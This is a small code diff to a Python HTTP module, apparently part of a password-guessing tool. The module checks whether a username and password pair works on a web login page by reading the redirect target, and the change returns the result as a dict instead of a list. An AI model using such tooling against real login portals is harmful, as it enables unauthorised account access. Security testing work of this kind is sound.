@@ -38,10 +38,17 @@ class Module(HTTPModule):
                 verify=self.verify_ssl,
                 allow_redirects=False,
                 proxies=self.proxies)
+
+        out = dict(
+            outcome=0,
+            username=username,
+            password=password)
     
         # verify credentials and return outcome
-        if resp.status_code == 302 and resp.headers['Location'] and (
-            search(r'auth\/logon\.aspx\?', resp.headers['Location'])):
-            return [0, username, password]
+        if resp.status_code == 302 and search(r'auth\/logon\.aspx\?',
+                resp.headers.get('Location','random string')):
+            pass
         else:
-            return [1, username, password]
+            out['outcome'] = 1
+
+        return out
